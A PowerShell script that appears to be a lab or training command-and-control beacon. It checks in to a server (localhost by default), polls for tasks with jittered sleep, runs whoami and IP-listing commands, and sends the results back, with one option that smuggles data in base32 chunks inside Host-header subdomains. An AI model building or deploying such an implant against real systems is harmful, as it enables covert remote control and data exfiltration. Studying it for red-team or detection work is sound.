Set-StrictMode -Version Latest
$ErrorActionPreference = 'Stop'
Add-Type -AssemblyName System.Net.Http

$project = Split-Path $PSScriptRoot -Parent
$server = if ($env:BOT_SERVER) { $env:BOT_SERVER.TrimEnd('/') } else { 'http://127.0.0.1:5000' }
$profileName = if ($env:BOT_PROFILE) { $env:BOT_PROFILE } else { 'standard' }
$configPath = if ($env:BOT_CONFIG) { $env:BOT_CONFIG } else { Join-Path $project "payload-$profileName.json" }
$sleepSeconds = if ($env:BOT_SLEEP) { [double]::Parse($env:BOT_SLEEP, [cultureinfo]::InvariantCulture) } else { 5.0 }
$jitter = if ($env:BOT_JITTER) { [double]::Parse($env:BOT_JITTER, [cultureinfo]::InvariantCulture) } else { 0.3 }
$jitter = [Math]::Min(1.0, [Math]::Max(0.0, $jitter))
if ($profileName -notin @('standard', 'mixed', 'host') -or $sleepSeconds -le 0) { throw 'Invalid BOT_PROFILE or BOT_SLEEP' }

$client = [System.Net.Http.HttpClient]::new()
$client.Timeout = [TimeSpan]::FromSeconds(5)

function ConvertTo-Map($value) {
    if ($value -is [pscustomobject]) {
        $map = @{}
        foreach ($property in $value.PSObject.Properties) { $map[$property.Name] = ConvertTo-Map $property.Value }
        return $map
    }
    return $value
}

function Invoke-Request([string]$method, [string]$endpoint, [string]$transport, [string]$field, $value, [string]$payload, [string]$partHost = '') {
    $url = "$server/$endpoint"
    $request = [System.Net.Http.HttpRequestMessage]::new([System.Net.Http.HttpMethod]::new($method), $url)
    try {
        if ($payload) { [void]$request.Headers.TryAddWithoutValidation('X-Payload-UUID', $payload) }
        if ($transport -eq 'host') {
            $request.Headers.Host = $partHost
        } elseif ($transport -eq 'query' -or $transport -eq 'form') {
            $text = if ($value -is [string]) { $value } else { ConvertTo-Json -InputObject $value -Depth 16 -Compress }
            $pair = [Uri]::EscapeDataString($field) + '=' + [Uri]::EscapeDataString($text)
            if ($transport -eq 'query') { $request.RequestUri = [Uri]::new("$url`?$pair") }
            else { $request.Content = [System.Net.Http.StringContent]::new($pair, [Text.Encoding]::UTF8, 'application/x-www-form-urlencoded') }
        } elseif ($transport -eq 'json') {
            $json = ConvertTo-Json -InputObject @{ $field = $value } -Depth 16 -Compress
            $request.Content = [System.Net.Http.StringContent]::new($json, [Text.Encoding]::UTF8, 'application/json')
        } else { throw "Unknown transport: $transport" }
        $response = $client.SendAsync($request).GetAwaiter().GetResult()
        try {
            $body = $response.Content.ReadAsStringAsync().GetAwaiter().GetResult()
            if (-not $response.IsSuccessStatusCode) { throw "HTTP $([int]$response.StatusCode): $body" }
            return ConvertTo-Map (ConvertFrom-Json -InputObject $body)
        } finally { $response.Dispose() }
    } finally { $request.Dispose() }
}

function ConvertTo-Base32([string]$text) {
    $alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567'
    $bits = 0; $buffer = 0; $out = [Text.StringBuilder]::new()
    foreach ($byte in [Text.Encoding]::UTF8.GetBytes($text)) {
        $buffer = ($buffer -shl 8) -bor [int]$byte; $bits += 8
        while ($bits -ge 5) {
            $bits -= 5
            [void]$out.Append($alphabet[($buffer -shr $bits) -band 31])
            $buffer = $buffer -band ((1 -shl $bits) - 1)
        }
    }
    if ($bits -gt 0) { [void]$out.Append($alphabet[($buffer -shl (5 - $bits)) -band 31]) }
    return $out.ToString()
}

function Invoke-Profile([string]$endpoint, [string]$operation, $value, $config) {
    $rule = $config.profile[$operation]
    if ($rule.transport -ne 'host') {
        return Invoke-Request $rule.method $endpoint $rule.transport $rule.field $value $config.payload_uuid
    }
    $text = if ($value -is [string]) { $value } else { ConvertTo-Json -InputObject $value -Depth 16 -Compress }
    $bytes = [Text.Encoding]::UTF8.GetByteCount($text)
    if ($bytes -lt 1 -or $bytes -gt 20000) { throw 'Host data must be 1..20000 UTF-8 bytes' }
    $encoded = ConvertTo-Base32 $text
    $parts = [Math]::Ceiling($encoded.Length / 50.0)
    $random = [Security.Cryptography.RandomNumberGenerator]::Create()
    $randomBytes = New-Object byte[] 6
    try { $random.GetBytes($randomBytes) } finally { $random.Dispose() }
    $id = [BitConverter]::ToString($randomBytes).Replace('-', '').ToLowerInvariant()
    $result = $null
    for ($i = 0; $i -lt $parts; $i++) {
        $chunk = $encoded.Substring($i * 50, [Math]::Min(50, $encoded.Length - $i * 50))
        $hostName = "m.$id.$($i + 1).$parts.$chunk.demo.test"
        $result = Invoke-Request $rule.method $endpoint 'host' $rule.field $value $config.payload_uuid $hostName
        if ($i -lt $parts - 1 -and -not $result.ContainsKey('received')) { throw 'Server rejected Host part' }
    }
    return $result
}

function Get-Config {
    if (Test-Path -LiteralPath $configPath) {
        $config = ConvertTo-Map (Get-Content -LiteralPath $configPath -Raw -Encoding UTF8 | ConvertFrom-Json)
        if ($config.server_url -cne $server) { throw 'BOT_SERVER does not match saved config' }
    } else {
        $config = Invoke-Request 'POST' 'payloads' 'json' 'profile' $profileName ''
        $config.server_url = $server
        $directory = Split-Path $configPath -Parent
        if ($directory -and -not (Test-Path -LiteralPath $directory)) { New-Item -ItemType Directory -Path $directory -Force | Out-Null }
        [IO.File]::WriteAllText([IO.Path]::GetFullPath($configPath), (ConvertTo-Json -InputObject $config -Depth 16), [Text.UTF8Encoding]::new($false))
    }
    [void][Guid]::Parse($config.payload_uuid)
    foreach ($op in @('checkin', 'get_task', 'post_task')) {
        $rule = $config.profile[$op]
        if (-not $rule -or $rule.method -notin @('GET','POST') -or $rule.transport -notin @('json','form','query','host') -or [string]::IsNullOrWhiteSpace($rule.field)) { throw "Invalid profile rule $op" }
        if ($rule.method -eq 'GET' -and $rule.transport -notin @('query','host')) { throw "Invalid GET rule $op" }
    }
    return $config
}

function Invoke-Command([string]$command) {
    switch ($command) {
        'whoami' { return (& "$env:SystemRoot\System32\whoami.exe" | Out-String).Trim() }
        'ip' {
            $lines = foreach ($adapter in [Net.NetworkInformation.NetworkInterface]::GetAllNetworkInterfaces()) {
                foreach ($address in $adapter.GetIPProperties().UnicastAddresses) {
                    if ($address.Address.AddressFamily -in @([Net.Sockets.AddressFamily]::InterNetwork, [Net.Sockets.AddressFamily]::InterNetworkV6)) { "$($adapter.Name): $($address.Address)" }
                }
            }
            if ($lines) { return ($lines -join "`n") }; return 'IP адресов не нашёл'
        }
        'exit' { return 'Выхожу' }
        default { throw 'Unknown command' }
    }
}

try {
    $config = Get-Config
    Write-Host "Config: $configPath Payload: $($config.payload_uuid)"
    $callback = (Invoke-Profile 'checkin' 'checkin' $config.payload_uuid $config).callback_uuid
    [void][Guid]::Parse($callback)
    Write-Host "Callback: $callback"
    $pending = $null
    while ($true) {
        try {
            if ($null -eq $pending) {
                $task = (Invoke-Profile 'poll' 'get_task' $callback $config).task
                if ($null -ne $task) {
                    try { $result = Invoke-Command $task.command } catch { $result = "Ошибка: $($_.Exception.Message)" }
                    if ($result.Length -gt 20000) { $result = $result.Substring(0, 20000) }
                    $pending = @{ task = $task; result = $result }
                    Write-Host "Task: $($task.task_id) $($task.command)"
                }
            }
            if ($null -ne $pending) {
                [void](Invoke-Profile 'results' 'post_task' @{callback_uuid=$callback; task_id=[int]$pending.task.task_id; result=$pending.result} $config)
                Write-Host "Result sent: $($pending.task.task_id)"
                if ($pending.task.command -eq 'exit') { break }
                $pending = $null
            }
        } catch {
            if ($_.Exception.Message -match '^HTTP 4\d\d:') { Write-Error "Server rejected request: $($_.Exception.Message)"; break }
            Write-Warning "Connection failed, retrying: $($_.Exception.Message)"
        }
        $variation = if ($jitter -eq 0) { 0 } else { Get-Random -Minimum (-$jitter) -Maximum $jitter }
        $delay = [Math]::Max(0.1, $sleepSeconds * (1 + $variation))
        Start-Sleep -Milliseconds ([int]($delay * 1000))
    }
} finally { $client.Dispose() }
